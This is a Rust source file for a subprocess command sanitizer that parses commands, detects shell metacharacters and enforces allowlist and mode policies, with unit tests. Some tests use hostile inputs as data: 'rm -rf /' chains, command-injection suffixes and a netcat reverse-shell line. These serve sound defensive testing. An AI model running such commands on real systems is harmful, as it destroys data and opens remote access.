use std::path::{Path, PathBuf};
use std::sync::Arc;

use crate::config::{ShellExecutionMode, WflConfig};

/// Result of command validation
#[derive(Debug, PartialEq)]
pub enum ValidationResult {
    /// Command is safe and doesn't need shell
    Safe { executable: PathBuf },
    /// Command requires shell features
    RequiresShell {
        reason: String,
        warnings: Vec<String>,
    },
    /// Command is blocked by security policy
    Blocked { reason: String },
}

/// Command sanitizer for subprocess security
pub struct CommandSanitizer {
    config: Arc<WflConfig>,
}

impl CommandSanitizer {
    pub fn new(config: Arc<WflConfig>) -> Self {
        Self { config }
    }

    fn strip_optional_path_quotes(value: &str) -> &str {
        let trimmed = value.trim();
        if trimmed.len() >= 2
            && ((trimmed.starts_with('"') && trimmed.ends_with('"'))
                || (trimmed.starts_with('\'') && trimmed.ends_with('\'')))
        {
            &trimmed[1..trimmed.len() - 1]
        } else {
            trimmed
        }
    }

    fn canonicalize_absolute_executable(value: &str, label: &str) -> Result<PathBuf, String> {
        let value = Self::strip_optional_path_quotes(value);
        let path = Path::new(value);
        if !path.is_absolute() {
            return Err(format!(
                "{label} '{value}' is not an absolute executable path"
            ));
        }

        let canonical = std::fs::canonicalize(path).map_err(|error| {
            format!(
                "{label} '{}' could not be resolved: {error}",
                path.display()
            )
        })?;
        if !canonical.is_file() {
            return Err(format!(
                "{label} '{}' does not resolve to a file",
                canonical.display()
            ));
        }
        Ok(canonical)
    }

    #[cfg(windows)]
    fn executable_paths_match(left: &Path, right: &Path) -> bool {
        left.to_string_lossy()
            .eq_ignore_ascii_case(right.to_string_lossy().as_ref())
    }

    #[cfg(not(windows))]
    fn executable_paths_match(left: &Path, right: &Path) -> bool {
        left == right
    }

    fn resolve_allowlisted_executable(&self, program: &str) -> Result<PathBuf, String> {
        let requested = Self::canonicalize_absolute_executable(program, "Requested executable")?;
        let mut unusable_entries = Vec::new();

        for allowed in &self.config.allowed_shell_commands {
            match Self::canonicalize_absolute_executable(allowed, "Allowlist entry") {
                Ok(candidate) if Self::executable_paths_match(&requested, &candidate) => {
                    return Ok(requested);
                }
                Ok(_) => {}
                Err(reason) => unusable_entries.push(reason),
            }
        }

        let unusable = if unusable_entries.is_empty() {
            String::new()
        } else {
            format!(" Unusable entries: {}", unusable_entries.join("; "))
        };
        Err(format!(
            "Executable '{}' resolves to '{}' but is not in allowed_shell_commands.{unusable}",
            program,
            requested.display()
        ))
    }

    /// Parse a command string into program and arguments
    ///
    /// Supports shell-like quoting and escaping:
    /// - Double quotes ("...") preserve spaces and support escapes (\n, \t, \r, \\, \", \0)
    /// - Single quotes ('...') preserve everything literally (no escape processing)
    /// - Backslash (\) outside quotes escapes the next character
    ///
    /// Returns error for unclosed quotes, trailing escapes, or empty commands
    ///
    /// Example: "echo hello world" -> ("echo", ["hello", "world"])
    /// Example: "grep 'hello world' file.txt" -> ("grep", ["hello world", "file.txt"])
    pub fn parse_command(command: &str) -> Result<(String, Vec<String>), String> {
        let trimmed = command.trim();
        if trimmed.is_empty() {
            return Err("Empty command".to_string());
        }

        #[derive(Debug, Clone, Copy, PartialEq)]
        enum State {
            Normal,         // Outside quotes
            InDoubleQuote,  // Inside "..."
            InSingleQuote,  // Inside '...'
            Escape,         // After backslash outside quotes
            EscapeInDouble, // After backslash inside double quotes
        }

        let mut parts = Vec::new();
        let mut current = String::new();
        let mut state = State::Normal;
        let mut in_quoted_context = false; // Track if we just closed quotes (for empty strings)

        for ch in trimmed.chars() {
            match state {
                State::Normal => match ch {
                    '"' => {
                        state = State::InDoubleQuote;
                        in_quoted_context = true;
                    }
                    '\'' => {
                        state = State::InSingleQuote;
                        in_quoted_context = true;
                    }
                    '\\' => state = State::Escape,
                    ' ' | '\t' => {
                        if !current.is_empty() || in_quoted_context {
                            parts.push(current.clone());
                            current.clear();
                            in_quoted_context = false;
                        }
                    }
                    _ => {
                        current.push(ch);
                        in_quoted_context = false;
                    }
                },

                State::InDoubleQuote => match ch {
                    '"' => state = State::Normal,
                    '\\' => state = State::EscapeInDouble,
                    _ => current.push(ch),
                },

                State::InSingleQuote => match ch {
                    '\'' => state = State::Normal,
                    _ => current.push(ch), // Single quotes preserve everything literally
                },

                State::Escape => {
                    current.push(ch); // Backslash outside quotes escapes next char
                    state = State::Normal;
                    in_quoted_context = false;
                }

                State::EscapeInDouble => {
                    // Handle escape sequences in double quotes
                    match ch {
                        'n' => current.push('\n'),
                        't' => current.push('\t'),
                        'r' => current.push('\r'),
                        '\\' => current.push('\\'),
                        '"' => current.push('"'),
                        '0' => current.push('\0'),
                        _ => {
                            current.push('\\');
                            current.push(ch);
                        }
                    }
                    state = State::InDoubleQuote;
                }
            }
        }

        // Check for unclosed quotes or trailing escape
        match state {
            State::InDoubleQuote => return Err("Unclosed double quote".to_string()),
            State::InSingleQuote => return Err("Unclosed single quote".to_string()),
            State::Escape | State::EscapeInDouble => {
                return Err("Trailing escape character".to_string());
            }
            State::Normal => {
                if !current.is_empty() || in_quoted_context {
                    parts.push(current);
                }
            }
        }

        if parts.is_empty() {
            return Err("No program specified".to_string());
        }

        let program = parts[0].clone();
        let args = parts[1..].to_vec();

        Ok((program, args))
    }

    #[cfg(windows)]
    fn split_allowlisted_windows_program(command: &str) -> Result<(String, &str), String> {
        let trimmed = command.trim();
        if trimmed.is_empty() {
            return Err("Empty command".to_string());
        }

        let first = trimmed.chars().next().unwrap();
        if first == '"' || first == '\'' {
            let content = &trimmed[first.len_utf8()..];
            let Some(end) = content.find(first) else {
                return Err(if first == '"' {
                    "Unclosed double quote".to_string()
                } else {
                    "Unclosed single quote".to_string()
                });
            };
            let program = content[..end].to_string();
            let remainder = &content[end + first.len_utf8()..];
            if remainder
                .chars()
                .next()
                .is_some_and(|ch| !ch.is_whitespace())
                && !Self::contains_shell_metacharacters(remainder)
            {
                return Err("Expected whitespace after quoted program".to_string());
            }
            Ok((program, remainder))
        } else {
            let end = trimmed
                .find(|ch: char| ch.is_whitespace())
                .unwrap_or(trimmed.len());
            Ok((trimmed[..end].to_string(), &trimmed[end..]))
        }
    }

    /// Parse a strict-allowlist direct command without treating native Windows
    /// executable path separators (including the `\\?\` canonical prefix) as
    /// shell escapes. Argument parsing retains the existing command grammar.
    pub(crate) fn parse_allowlisted_command(
        command: &str,
    ) -> Result<(String, Vec<String>), String> {
        #[cfg(windows)]
        {
            let (program, remainder) = Self::split_allowlisted_windows_program(command)?;
            let args = if remainder.trim().is_empty() {
                Vec::new()
            } else {
                let synthetic = format!("allowlisted-program {remainder}");
                Self::parse_command(&synthetic)?.1
            };
            Ok((program, args))
        }

        #[cfg(not(windows))]
        {
            Self::parse_command(command)
        }
    }

    /// Detect shell syntax for strict allowlisting while excluding a native
    /// Windows executable token whose separators are path data, not syntax.
    pub(crate) fn allowlisted_command_requires_shell(command: &str) -> Result<bool, String> {
        #[cfg(windows)]
        {
            let (_, remainder) = Self::split_allowlisted_windows_program(command)?;
            Ok(Self::contains_shell_metacharacters(remainder))
        }

        #[cfg(not(windows))]
        {
            Ok(Self::contains_shell_metacharacters(command))
        }
    }

    /// Check if command contains shell metacharacters
    pub fn contains_shell_metacharacters(command: &str) -> bool {
        const SHELL_METACHARACTERS: &[char] = &[
            ';', '|', '&', '<', '>', '$', '`', '(', ')', '{', '}', '[', ']', '*', '?', '~', '!',
            '\\', '\n', '\r',
        ];

        // Check for metacharacters
        for ch in SHELL_METACHARACTERS {
            if command.contains(*ch) {
                return true;
            }
        }

        // Check for command substitution patterns
        if command.contains("$(") || command.contains("${") {
            return true;
        }

        false
    }

    /// Authorize any subprocess launch (shell path or direct-exec).
    ///
    /// This is the single policy gate used before `Command::new` on both the
    /// execute-command and spawn-process paths. Defaults deny all process
    /// execution (`allow_shell_execution = false` and/or
    /// `shell_execution_mode = forbidden`).
    pub fn authorize_process_execution(
        &self,
        program: &str,
        needs_shell: bool,
        command_for_analysis: &str,
    ) -> Result<ValidationResult, String> {
        // Master switch: when false, all subprocess execution is blocked.
        if !self.config.allow_shell_execution {
            return Ok(ValidationResult::Blocked {
                reason: "Subprocess execution is disabled (allow_shell_execution = false)"
                    .to_string(),
            });
        }

        match self.config.shell_execution_mode {
            ShellExecutionMode::Forbidden => Ok(ValidationResult::Blocked {
                reason: "Subprocess execution is disabled by security policy \
                         (shell_execution_mode = forbidden)"
                    .to_string(),
            }),
            ShellExecutionMode::AllowlistOnly => {
                if needs_shell {
                    Ok(ValidationResult::Blocked {
                        reason: "allowlist_only does not permit shell execution; use direct execution with arguments or deliberately select a shell-capable mode".to_string(),
                    })
                } else {
                    match self.resolve_allowlisted_executable(program) {
                        Ok(executable) => Ok(ValidationResult::Safe { executable }),
                        Err(reason) => Ok(ValidationResult::Blocked { reason }),
                    }
                }
            }
            ShellExecutionMode::Sanitized => {
                if needs_shell {
                    let warnings = self.analyze_shell_features(command_for_analysis);
                    Ok(ValidationResult::RequiresShell {
                        reason: "Command contains shell features".to_string(),
                        warnings,
                    })
                } else {
                    Ok(ValidationResult::Safe {
                        executable: PathBuf::from(program),
                    })
                }
            }
            ShellExecutionMode::Unrestricted => {
                if needs_shell {
                    Ok(ValidationResult::RequiresShell {
                        reason: "Unrestricted shell mode enabled".to_string(),
                        warnings: vec!["⚠️ Using unrestricted shell execution".to_string()],
                    })
                } else {
                    Ok(ValidationResult::Safe {
                        executable: PathBuf::from(program),
                    })
                }
            }
        }
    }

    /// Validate a full command string against security policy.
    ///
    /// Resolves the program name from the command string and delegates to
    /// [`authorize_process_execution`]. Kept for callers that only have the
    /// raw command line.
    pub fn validate_command(&self, command: &str) -> Result<ValidationResult, String> {
        let allowlist_only = matches!(
            self.config.shell_execution_mode,
            ShellExecutionMode::AllowlistOnly
        );
        let has_shell_features = if allowlist_only {
            Self::allowlisted_command_requires_shell(command)?
        } else {
            Self::contains_shell_metacharacters(command)
        };
        let program = if has_shell_features {
            String::new()
        } else if allowlist_only {
            Self::parse_allowlisted_command(command)?.0
        } else {
            Self::parse_command(command)?.0
        };
        self.authorize_process_execution(&program, has_shell_features, command)
    }

    /// Check if a program (or command string) is in the allowlist
    pub fn is_allowlisted(&self, command: &str) -> bool {
        let Ok(requires_shell) = Self::allowlisted_command_requires_shell(command) else {
            return false;
        };
        if requires_shell {
            return false;
        }
        let Ok((program, _)) = Self::parse_allowlisted_command(command) else {
            return false;
        };
        self.resolve_allowlisted_executable(&program).is_ok()
    }

    /// Basename of a program path (`/bin/echo` → `echo`, `C:\\Windows\\cmd.exe` → `cmd.exe`)
    pub fn program_basename(program: &str) -> String {
        let trimmed = program.trim().trim_matches('"').trim_matches('\'');
        trimmed
            .rsplit(['/', '\\'])
            .next()
            .unwrap_or(trimmed)
            .to_string()
    }

    /// Analyze shell features and provide warnings
    fn analyze_shell_features(&self, command: &str) -> Vec<String> {
        let mut warnings = Vec::new();

        if command.contains(';') {
            warnings.push("Command chaining detected (;)".to_string());
        }
        if command.contains('|') {
            warnings.push("Pipe detected (|)".to_string());
        }
        if command.contains('&') {
            warnings.push("Background execution or AND operator detected (&)".to_string());
        }
        if command.contains('>') || command.contains('<') {
            warnings.push("Redirection detected (< or >)".to_string());
        }
        if command.contains('$') {
            warnings.push("Variable expansion detected ($)".to_string());
        }
        if command.contains("$(") || command.contains('`') {
            warnings.push("Command substitution detected ($(...)  or `...`)".to_string());
        }
        if command.contains('*') || command.contains('?') {
            warnings.push("Glob pattern detected (* or ?)".to_string());
        }

        if warnings.is_empty() {
            warnings.push("Shell features detected".to_string());
        }

        warnings
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::WflConfig;

    fn test_config(mode: ShellExecutionMode) -> Arc<WflConfig> {
        let config = WflConfig {
            allow_shell_execution: true,
            shell_execution_mode: mode,
            ..Default::default()
        };
        Arc::new(config)
    }

    fn default_secure_config() -> Arc<WflConfig> {
        Arc::new(WflConfig::default())
    }

    fn allowlist_config(allowed_shell_commands: Vec<String>) -> Arc<WflConfig> {
        Arc::new(WflConfig {
            allow_shell_execution: true,
            shell_execution_mode: ShellExecutionMode::AllowlistOnly,
            allowed_shell_commands,
            ..Default::default()
        })
    }

    #[test]
    fn test_allowlist_only_blocks_shell_for_allowed_program() {
        let executable = std::env::current_exe().unwrap();
        let sanitizer = CommandSanitizer::new(allowlist_config(vec![
            executable.to_string_lossy().into_owned(),
        ]));

        let result = sanitizer
            .authorize_process_execution(
                executable.to_str().unwrap(),
                true,
                "allowed-tool --version; echo injected",
            )
            .unwrap();

        assert!(
            matches!(&result, ValidationResult::Blocked { reason }
                if reason.contains("does not permit shell execution")),
            "allowlist_only must reject shell execution, got {result:?}"
        );
    }

    #[test]
    fn test_allowlist_only_rejects_bare_program_names() {
        let sanitizer = CommandSanitizer::new(allowlist_config(vec!["echo".to_string()]));

        let result = sanitizer
            .authorize_process_execution("echo", false, "echo")
            .unwrap();

        assert!(
            matches!(&result, ValidationResult::Blocked { reason }
                if reason.contains("absolute executable path")),
            "bare program names must not enter OS path lookup, got {result:?}"
        );
    }

    #[test]
    fn test_allowlist_only_rejects_different_path_with_same_basename() {
        let temp = tempfile::tempdir().unwrap();
        let allowed_dir = temp.path().join("allowed");
        let attacker_dir = temp.path().join("attacker");
        std::fs::create_dir_all(&allowed_dir).unwrap();
        std::fs::create_dir_all(&attacker_dir).unwrap();
        let allowed = allowed_dir.join("same-name-tool");
        let attacker = attacker_dir.join("same-name-tool");
        std::fs::write(&allowed, b"allowed").unwrap();
        std::fs::write(&attacker, b"attacker").unwrap();

        let sanitizer = CommandSanitizer::new(allowlist_config(vec![
            allowed.to_string_lossy().into_owned(),
        ]));
        let result = sanitizer
            .authorize_process_execution(attacker.to_str().unwrap(), false, "same-name-tool")
            .unwrap();

        assert!(
            matches!(&result, ValidationResult::Blocked { reason }
                if reason.contains("not in allowed_shell_commands")),
            "same basename at another path must be blocked, got {result:?}"
        );
    }

    #[cfg(windows)]
    #[test]
    fn test_allowlist_only_windows_path_validate_command_accepts_native() {
        let requested = std::env::current_exe().unwrap();
        let canonical = std::fs::canonicalize(&requested).unwrap();
        let sanitizer = CommandSanitizer::new(allowlist_config(vec![
            canonical.to_string_lossy().into_owned(),
        ]));
        let command = format!("\"{}\"", requested.display());

        let result = sanitizer.validate_command(&command).unwrap();

        assert_eq!(
            result,
            ValidationResult::Safe {
                executable: canonical
            },
            "ordinary native Windows path must remain a direct executable"
        );
    }

    #[cfg(windows)]
    #[test]
    fn test_allowlist_only_windows_path_validate_command_accepts_canonical() {
        let canonical = std::fs::canonicalize(std::env::current_exe().unwrap()).unwrap();
        let sanitizer = CommandSanitizer::new(allowlist_config(vec![
            canonical.to_string_lossy().into_owned(),
        ]));
        let command = format!("\"{}\"", canonical.display());

        let result = sanitizer.validate_command(&command).unwrap();

        assert_eq!(
            result,
            ValidationResult::Safe {
                executable: canonical
            },
            "Rust-canonical Windows path must remain a direct executable"
        );
    }

    #[cfg(unix)]
    #[test]
    fn test_allowlist_only_accepts_symlink_to_same_canonical_executable() {
        use std::os::unix::fs::symlink;

        let temp = tempfile::tempdir().unwrap();
        let target = temp.path().join("real-tool");
        let alias = temp.path().join("alias-tool");
        std::fs::write(&target, b"allowed").unwrap();
        symlink(&target, &alias).unwrap();
        let sanitizer = CommandSanitizer::new(allowlist_config(vec![
            target.to_string_lossy().into_owned(),
        ]));

        let result = sanitizer
            .authorize_process_execution(alias.to_str().unwrap(), false, "alias-tool")
            .unwrap();

        assert!(
            matches!(&result, ValidationResult::Safe { .. }),
            "a symlink to the same canonical file should be allowed, got {result:?}"
        );
    }

    #[test]
    fn test_parse_command_simple() {
        let (prog, args) = CommandSanitizer::parse_command("echo hello world").unwrap();
        assert_eq!(prog, "echo");
        assert_eq!(args, vec!["hello", "world"]);
    }

    #[test]
    fn test_parse_command_with_quotes() {
        let (prog, args) =
            CommandSanitizer::parse_command(r#"grep "hello world" file.txt"#).unwrap();
        assert_eq!(prog, "grep");
        assert_eq!(args, vec!["hello world", "file.txt"]);
    }

    #[test]
    fn test_parse_command_single_program() {
        let (prog, args) = CommandSanitizer::parse_command("ls").unwrap();
        assert_eq!(prog, "ls");
        assert_eq!(args, Vec::<String>::new());
    }

    #[test]
    fn test_parse_command_empty() {
        assert!(CommandSanitizer::parse_command("").is_err());
        assert!(CommandSanitizer::parse_command("   ").is_err());
    }

    #[test]
    fn test_parse_command_single_quotes() {
        let (prog, args) =
            CommandSanitizer::parse_command(r#"grep 'hello world' file.txt"#).unwrap();
        assert_eq!(prog, "grep");
        assert_eq!(args, vec!["hello world", "file.txt"]);
    }

    #[test]
    fn test_parse_command_mixed_quotes() {
        let (prog, args) =
            CommandSanitizer::parse_command(r#"cmd "arg one" 'arg two' arg3"#).unwrap();
        assert_eq!(prog, "cmd");
        assert_eq!(args, vec!["arg one", "arg two", "arg3"]);
    }

    #[test]
    fn test_parse_command_escaped_double_quote() {
        let (prog, args) = CommandSanitizer::parse_command(r#"echo "say \"hello\"""#).unwrap();
        assert_eq!(prog, "echo");
        assert_eq!(args, vec![r#"say "hello""#]);
    }

    #[test]
    fn test_parse_command_escaped_backslash() {
        let (prog, args) = CommandSanitizer::parse_command(r#"echo "path\\to\\file""#).unwrap();
        assert_eq!(prog, "echo");
        assert_eq!(args, vec![r#"path\to\file"#]);
    }

    #[test]
    fn test_parse_command_escape_outside_quotes() {
        let (prog, args) = CommandSanitizer::parse_command(r#"echo hello\ world"#).unwrap();
        assert_eq!(prog, "echo");
        assert_eq!(args, vec!["hello world"]);
    }

    #[test]
    fn test_parse_command_unclosed_double_quote() {
        let result = CommandSanitizer::parse_command(r#"echo "hello"#);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Unclosed"));
    }

    #[test]
    fn test_parse_command_unclosed_single_quote() {
        let result = CommandSanitizer::parse_command(r#"echo 'hello"#);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Unclosed"));
    }

    #[test]
    fn test_parse_command_trailing_backslash() {
        let result = CommandSanitizer::parse_command(r#"echo hello\"#);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("escape"));
    }

    #[test]
    fn test_parse_command_empty_quotes() {
        let (prog, args) = CommandSanitizer::parse_command(r#"echo "" test"#).unwrap();
        assert_eq!(prog, "echo");
        assert_eq!(args, vec!["", "test"]);
    }

    #[test]
    fn test_parse_command_single_quote_no_escapes() {
        // Single quotes preserve everything literally
        let (prog, args) = CommandSanitizer::parse_command(r#"echo 'test\n\t'"#).unwrap();
        assert_eq!(prog, "echo");
        assert_eq!(args, vec![r#"test\n\t"#]);
    }

    #[test]
    fn test_contains_shell_metacharacters() {
        assert!(CommandSanitizer::contains_shell_metacharacters(
            "echo test; rm -rf /"
        ));
        assert!(CommandSanitizer::contains_shell_metacharacters(
            "ls | grep test"
        ));
        assert!(CommandSanitizer::contains_shell_metacharacters(
            "echo $HOME"
        ));
        assert!(CommandSanitizer::contains_shell_metacharacters(
            "cat $(which bash)"
        ));
        assert!(CommandSanitizer::contains_shell_metacharacters(
            "ls > output.txt"
        ));
        assert!(!CommandSanitizer::contains_shell_metacharacters(
            "echo hello world"
        ));
    }

    #[test]
    fn test_default_config_blocks_all_process_execution() {
        let sanitizer = CommandSanitizer::new(default_secure_config());
        // Direct-exec style programs must be blocked under secure defaults
        for cmd in ["echo hello", "sh", "nc -e /bin/sh host 4444"] {
            let result = sanitizer.validate_command(cmd).unwrap();
            assert!(
                matches!(result, ValidationResult::Blocked { .. }),
                "default config must block '{}', got {:?}",
                cmd,
                result
            );
        }
    }

    #[test]
    fn test_authorize_blocks_when_allow_shell_execution_false() {
        let config = WflConfig {
            allow_shell_execution: false,
            shell_execution_mode: ShellExecutionMode::Sanitized,
            ..Default::default()
        };
        let sanitizer = CommandSanitizer::new(Arc::new(config));
        let result = sanitizer
            .authorize_process_execution("echo", false, "echo")
            .unwrap();
        match result {
            ValidationResult::Blocked { reason } => {
                assert!(reason.contains("allow_shell_execution"));
            }
            other => panic!("Expected Blocked, got {:?}", other),
        }
    }

    #[test]
    fn test_authorize_forbidden_blocks_direct_exec() {
        let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Forbidden));
        let result = sanitizer
            .authorize_process_execution("sh", false, "sh")
            .unwrap();
        assert!(matches!(result, ValidationResult::Blocked { .. }));
        let result = sanitizer
            .authorize_process_execution("echo", false, "echo")
            .unwrap();
        assert!(matches!(result, ValidationResult::Blocked { .. }));
    }

    #[test]
    fn test_validate_command_blocked_forbidden() {
        let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Forbidden));
        let result = sanitizer.validate_command("echo $HOME").unwrap();
        assert!(matches!(result, ValidationResult::Blocked { .. }));
        // Forbidden also blocks non-shell direct-exec
        let result = sanitizer.validate_command("echo hello").unwrap();
        assert!(matches!(result, ValidationResult::Blocked { .. }));
    }

    #[test]
    fn test_validate_command_sanitized_direct_exec_safe() {
        let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Sanitized));
        let result = sanitizer.validate_command("echo hello").unwrap();
        assert_eq!(
            result,
            ValidationResult::Safe {
                executable: PathBuf::from("echo")
            }
        );
    }

    #[test]
    fn test_validate_command_sanitized() {
        let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Sanitized));
        let result = sanitizer.validate_command("echo test | grep t").unwrap();
        match result {
            ValidationResult::RequiresShell { warnings, .. } => {
                assert!(!warnings.is_empty());
                assert!(warnings.iter().any(|w| w.contains("Pipe")));
            }
            _ => panic!("Expected RequiresShell"),
        }
    }

    #[test]
    fn test_validate_command_unrestricted() {
        let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Unrestricted));
        // Use command with actual shell features
        let result = sanitizer.validate_command("rm -rf / && echo done").unwrap();
        assert!(matches!(result, ValidationResult::RequiresShell { .. }));
    }

    #[test]
    fn test_authorize_allowlist_only() {
        let requested = std::fs::canonicalize(std::env::current_exe().unwrap()).unwrap();
        let sanitizer = CommandSanitizer::new(allowlist_config(vec![
            requested.to_string_lossy().into_owned(),
        ]));

        let ok = sanitizer
            .authorize_process_execution(requested.to_str().unwrap(), false, "test executable")
            .unwrap();
        assert_eq!(
            ok,
            ValidationResult::Safe {
                executable: requested
            }
        );

        let blocked = sanitizer
            .authorize_process_execution("rm", false, "rm")
            .unwrap();
        assert!(matches!(blocked, ValidationResult::Blocked { .. }));
    }

    #[test]
    fn test_is_allowlisted() {
        let current_exe = std::env::current_exe().unwrap();
        let executable = std::fs::canonicalize(&current_exe).unwrap();
        let sanitizer = CommandSanitizer::new(allowlist_config(vec![
            executable.to_string_lossy().into_owned(),
        ]));
        let quoted_executable = format!("\"{}\"", current_exe.display());
        let quoted_canonical = format!("\"{}\"", executable.display());

        assert!(sanitizer.is_allowlisted(&quoted_executable));
        assert!(sanitizer.is_allowlisted(&quoted_canonical));
        assert!(!sanitizer.is_allowlisted(&format!("{quoted_executable}; echo injected")));
        assert!(!sanitizer.is_allowlisted(executable.file_name().unwrap().to_str().unwrap()));

        let temp = tempfile::tempdir().unwrap();
        let different = temp.path().join(executable.file_name().unwrap());
        std::fs::write(&different, b"different executable").unwrap();
        assert!(!sanitizer.is_allowlisted(&format!("\"{}\"", different.display())));
    }

    #[test]
    fn test_program_basename() {
        assert_eq!(CommandSanitizer::program_basename("echo"), "echo");
        assert_eq!(CommandSanitizer::program_basename("/bin/echo"), "echo");
        assert_eq!(
            CommandSanitizer::program_basename(r"C:\Windows\System32\cmd.exe"),
            "cmd.exe"
        );
    }

    #[test]
    fn test_analyze_shell_features() {
        let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Sanitized));
        let warnings = sanitizer.analyze_shell_features("echo test; ls | grep x > output.txt");

        assert!(warnings.iter().any(|w| w.contains("chaining")));
        assert!(warnings.iter().any(|w| w.contains("Pipe")));
        assert!(warnings.iter().any(|w| w.contains("Redirection")));
    }
}
